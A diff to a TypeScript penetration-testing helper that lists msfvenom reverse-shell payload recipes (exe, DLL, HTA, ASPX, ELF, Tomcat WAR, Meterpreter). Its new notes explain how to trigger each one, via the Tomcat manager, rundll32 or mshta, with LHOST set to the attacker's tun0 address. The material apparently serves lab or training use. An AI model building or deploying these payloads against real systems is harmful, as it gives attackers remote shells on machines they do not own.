@@ -26,7 +26,7 @@ function parts(payload: string, fmt: string, file: string, fmtExplain: string): 
     { token: "LHOST={LHOST}", explain: "Your listener's IP, baked into the file. Use the tun0 address and regenerate after any VPN reconnect." },
     { token: "LPORT={LPORT}", explain: "The port your listener waits on, baked into the file." },
     { token: `-f ${fmt}`, explain: fmtExplain },
-    { token: `-o ${file}`, explain: `-o: where msfvenom writes the result. Without it the bytes go to stdout and wreck your terminal. {FILE} (default ${file}) is the name the target will see; for DLL hijacking name it exactly as the DLL being searched for.` },
+    { token: "-o {FILE}", explain: `-o: where msfvenom writes the result. Without it the bytes go to stdout and wreck your terminal. FILE (default ${file}) is the name the target will see; for DLL hijacking name it exactly as the DLL being searched for.` },
   ];
 }
 
@@ -47,26 +47,29 @@ function def(
 
 const WIN64 = "windows/x64/shell_reverse_tcp";
 const JAVA = "java/jsp_shell_reverse_tcp";
-const WAR_NOTE = "Deploy through the Tomcat manager (or drop in webapps/), then browse to /rev/ to fire it.";
+/** Tomcat names the app after the WAR file (rev.war → /rev/) unless the deploy gives its own path=. Confirmed by the owner's card. */
+const WAR_NOTE = "Deploy through the Tomcat manager (or drop it in webapps/), then browse to /{FILE_STEM}/ to fire it: the app's path is the file name without .war, or the path= you deploy it with. The text deploy (/manager/text/deploy) needs a manager-script user.";
+/** msfvenom's DLL template starts the payload from DllMain on load, so rundll32 fires it whatever export is named. */
+const DLL_NOTE = "To run it by hand: rundll32 C:\\path\\to\\{FILE_NAME},x. The shell starts from DllMain when the DLL loads, so any export name works; rundll32 may then complain the entry point is missing, and the shell still runs.";
+/** The x64 payload wants a 64-bit mshta; which one a double-click uses is unverified, so the note says to check. */
+const HTA_NOTE = "Run it with the 64-bit mshta: C:\\Windows\\System32\\mshta.exe <path or URL of {FILE_NAME}>. C:\\Windows\\SysWOW64\\mshta.exe is 32-bit, and a double-click may use it (check the .hta association): if the shell never arrives, check which mshta ran it.";
 const WAR_FMT = "-f war: a deployable Tomcat archive wrapping the JSP shell.";
 
 export const MSFVENOM: PayloadDef[] = [
   def("msf-win-x64-exe", "Windows x64 exe", "windows", WIN64, "exe", "rev.exe",
     "-f exe: a Windows PE executable. For a service binary use exe-service instead, or the service dies with error 1053.", [ARCH_NOTE]),
   def("msf-win-x64-dll", "Windows x64 DLL", "windows", WIN64, "dll", "rev.dll",
-    "-f dll: a Windows DLL for hijacking or `rundll32 rev.dll,<export>`. The host process must be x64 to load it.", [ARCH_NOTE]),
+    "-f dll: a Windows DLL for hijacking, or to run with rundll32. The host process must be x64 to load it.", [ARCH_NOTE, DLL_NOTE]),
   def("msf-win-x64-hta", "Windows x64 HTA", "windows", WIN64, "hta-psh", "rev.hta",
-    "-f hta-psh: an HTML Application that launches the shell through PowerShell when opened with mshta.", [ARCH_NOTE]),
+    "-f hta-psh: an HTML Application that launches the shell through PowerShell when opened with mshta.", [ARCH_NOTE, HTA_NOTE]),
   def("msf-win-x86-exe", "Windows x86 exe", "windows", "windows/shell_reverse_tcp", "exe", "rev32.exe",
     "-f exe: a Windows PE executable (32-bit here, so it also runs on x64 through WOW64).", ["x86 for Veil/Shellter"]),
   def("msf-linux-x64-elf", "Linux x64 ELF", "linux", "linux/x64/shell_reverse_tcp", "elf", "rev.elf",
     "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE]),
   def("msf-win-x64-aspx", "Windows x64 ASPX", "windows", WIN64, "aspx", "rev.aspx",
     "-f aspx: an ASP.NET page that runs the shell when requested. Upload to an IIS site that executes .aspx.", [ARCH_NOTE]),
-  // PayloadDef.os is a single value, so the OS-agnostic WAR is listed once per OS: a Windows Tomcat host
-  // must not fold it as "Wrong OS", and a Linux one must not either.
-  def("msf-java-war-linux", "Java WAR (Tomcat on Linux)", "linux", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Windows entry; listed per OS so the fit filter keeps it."]),
-  def("msf-java-war-windows", "Java WAR (Tomcat on Windows)", "windows", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Linux entry; listed per OS so the fit filter keeps it."]),
+  // The same WAR runs on Tomcat on either OS, so it is one any-OS def (it never folds as "Wrong OS").
+  def("msf-java-war", "Java WAR (Tomcat)", "any", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE]),
 
   def("msf-win-x64-met-staged", "Windows x64 Meterpreter (staged)", "windows", "windows/x64/meterpreter/reverse_tcp", "exe", "met.exe",
     "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
